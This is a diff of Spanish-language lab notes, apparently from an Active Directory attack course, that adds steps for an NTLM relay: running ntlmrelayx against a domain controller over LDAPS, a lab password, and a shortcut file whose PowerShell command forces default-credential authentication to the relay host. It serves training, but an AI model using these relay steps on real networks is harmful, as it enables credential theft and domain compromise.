@@ -31,8 +31,21 @@ A continuación necesitaremos ejecutar *ntlmrelayx* usando *WSL* para poder retr
 sudo ntlmrelayx.py -t ldaps://<IP_DC> -wh <IP_VM> --http-port '80,8080' -i --no-smb-server
 ```
 
+```ad-warning
+*La contraseña es*
+WSLToTh3Rescue!
+```
+
 Para obtener la IP del controlador del dominio deberemos de hacer ping a este
 ```shell
 ping DOLLARCORP.MONEYCORP.LOCAL
 ```
 
+Una vez ejecutado el comando desde la maquina de estudiante deberemos de establecer la autenticación en la maquina de estudiante y crear un oyente que se conecte al *ntlmrelayx*
+
+Nos dirigiremos a *C:\AD\Tools* crearemos un nuevo *shortcut* y en la ubicación que pide para el acceso directo hay que poner el siguiente comando
+```shell
+C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -Command "Invoke-WebRequest -Uri 'http://172.16.100.67' -UseDefaultCredentials"
+```
+
+Y guardarlo como *student97.lnk*
